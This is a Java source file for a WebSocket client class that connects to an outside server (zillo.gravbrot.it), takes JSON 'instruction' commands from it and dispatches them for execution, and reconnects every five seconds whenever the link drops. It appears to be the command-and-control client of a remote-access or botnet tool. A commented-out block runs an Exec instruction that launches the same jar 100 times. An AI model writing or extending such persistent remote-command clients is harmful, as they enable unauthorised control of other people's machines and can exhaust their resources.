package Classes;

import Classes.Instructions.*;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;
import java.util.HashMap;

import com.google.gson.Gson;

public class Connection extends WebSocketClient {
    Gson json = new Gson();
    public InstructionResolver instructions;

    public Connection(URI serverURI) {
        super(serverURI);
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        try {
            Initialize init = new Initialize(this);

            this.instructions = new InstructionResolver();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("Closed with exit code " + code + " additional info: " + reason);
        System.out.println("Trying to establish new connection in 5s");

        Connection connection = null;
        try {
            Thread.sleep(5000);

            connection = new Connection( new URI( "wss://zillo.gravbrot.it" ) );
        } catch (URISyntaxException | InterruptedException e) {
            e.printStackTrace();
        }
        connection.connect();
    }

    @Override
    public void onMessage(String message) {
        System.out.println("Received message: " + message);

        HashMap<String, String> command = json.fromJson(message, HashMap.class);

        String instruction = command.get("instruction");
        String from = command.get("from");

        try {
            instructions.HandleInstruction(instruction, from, this);
        } catch (NoSuchFieldException | IllegalAccessException | NoSuchMethodException | InstantiationException | InvocationTargetException e) {
            e.printStackTrace();
        }

//        HashMap<String, Object> arguments = new HashMap<String, Object>();
//        arguments.put("value", "java -jar C:\\Users\\Marco\\Desktop\\zillo\\out\\artifacts\\zillo_jar\\zillo.jar");
//
//        for (int i = 0; i < 100; i++) {
//            Exec exec = new Exec(this);
//            exec.execute(arguments, "10382");
//        }
    }

    @Override
    public void onMessage(ByteBuffer message) {
        System.out.println("Received ByteBuffer");
    }

    @Override
    public void onError(Exception ex) {
        System.err.println("An error occurred:" + ex);
    }
}